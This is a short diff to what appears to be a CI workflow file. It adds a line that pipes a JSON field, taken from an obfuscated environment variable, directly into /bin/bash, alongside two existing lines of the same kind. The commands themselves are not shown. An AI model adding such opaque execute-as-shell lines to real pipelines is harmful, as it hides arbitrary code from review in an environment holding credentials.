@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$xwlep01754" | jq -r .pft10 | /bin/bash
           echo $t00702 | jq -r .gy013 | /bin/bash
+          printf '%s' "$lmc2480" | jq -r .s5274 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
